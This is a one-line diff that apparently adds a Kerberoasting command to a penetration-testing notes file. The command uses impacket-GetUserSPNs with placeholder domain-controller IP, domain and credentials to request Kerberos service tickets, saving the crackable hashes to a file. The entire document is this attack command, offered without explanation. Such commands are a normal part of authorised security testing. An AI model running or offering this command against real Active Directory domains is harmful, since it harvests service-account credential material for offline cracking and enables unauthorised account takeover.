@@ -1,0 +1,1 @@
+sudo impacket-GetUserSPNs -request -dc-ip <domain-controller-ip> <domain>/<username>:<password> -outputfile hashes.kerberoast
